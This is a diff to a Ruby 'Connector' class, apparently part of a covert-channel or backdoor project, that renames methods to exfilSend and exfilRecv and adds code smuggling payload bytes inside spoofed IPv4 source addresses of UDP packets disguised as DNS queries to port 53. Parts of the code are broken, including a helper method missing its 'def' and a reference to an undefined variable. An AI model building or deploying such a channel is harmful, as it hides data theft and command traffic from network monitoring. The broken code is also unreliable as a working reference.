@@ -35,7 +35,7 @@ class Connector
     @id = 32452
   end
 
-  def send(payload)
+  def exfilSend(payload)
     case @connection
       when "tcp"
         tcpSend(payload)
@@ -49,7 +49,7 @@ class Connector
 
   end
 
-  def recv(pkt)
+  def exfilRecv(pkt)
     case @connection
       when "tcp"
         payload = tcpRecv(pkt)
@@ -87,16 +87,85 @@ class Connector
     tcp_pkt.to_w(@iface)
   end
 
-  def cliSend(str)
+  def cliSend(payload)
     puts "sending command to client: #{str}"
+    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 53, :udp_dst => $cliPass)
+    i = 0
+    while  payload.length > 0
+      if i % 4 == 0
+        a = payload[i]
+      end
+      if i % 4 == 1
+        b = payload[i+1]
+      end
+      if i % 4 == 2
+        c = payload[i+2]
+      end
+      if i % 4 == 3
+        d = payload[i+3]
+        s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+        payload = payload[4..-1]
+        cliPacketize(s_addr)
+        a=b=c=d=10
+        s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+        cliPacketize(s_addr)
+        if payload.length == 0
+          return
+        end
+      end
+      i += 1
+    end
 
-
+    b=c=d=10
+    a = payload[0]
+    payload = payload[1..-1]
+    if payload.length == 0
+      s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+      cliPacketize(s_addr)
+      return
+    end
+    b = payload[0]
+    payload = payload[1..-1]
+    if payload.length == 0
+      s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+      cliPacketize(s_addr)
+      return
+    end
+    c = payload[0]
+    payload = payload[1..-1]
+    if payload.length == 0
+      s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+      cliPacketize(s_addr)
+      return
+    end
+    d = payload[0]
+    payload = payload[1..-1]
+    if payload.length == 0
+      s_addr = a.to_s + "." + b.to_s + "." + c.to_s + "." + d.to_s
+      cliPacketize(s_addr)
+      return
+    end
   end
 
-  def server()
+  def servRecv(pkt)
+    a = pkt.ip_saddr.split(".")
+    puts a
   end
 
   private
+  cliPacketize(saddr)
+    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 21423, :udp_dst => 53)
+    udp_pkt.eth_daddr = $destMac
+    udp_pkt.ip_daddr = $ipDest
+    udp_pkt.ip_saddr = saddr
+    udp_pkt.payload =  "\x4d"+"\xe2"+"\x81"+"\x82"+"\x00"+"\x01"+"\x00"+"\x00"
+    udp_pkt.payload += "\x00"+"\x00"+"\x00"+"\x00"+"\x08"+"\x44"+"\x61"+"\x74"
+    udp_pkt.payload += "\x61"+"\x43"+"\x6f"+"\x6d"+"\x6d"+"\x00"+"\x00"+"\x01"
+    udp_pkt.payload += "\x00"+"\x02"
+    udp_pkt.recalc
+    udp_pkt.to_w(@iface)
+  end
+
   def tcpSend(payload)
 
     tcp_pkt = TCPPacket.new(:config => $config)
@@ -135,4 +204,5 @@ def testSend
   a = Connector.new("wlan0", "tcp", "192.168.0.97", "moo", "client", 53)
   a.send("doggy")
 end
+
 
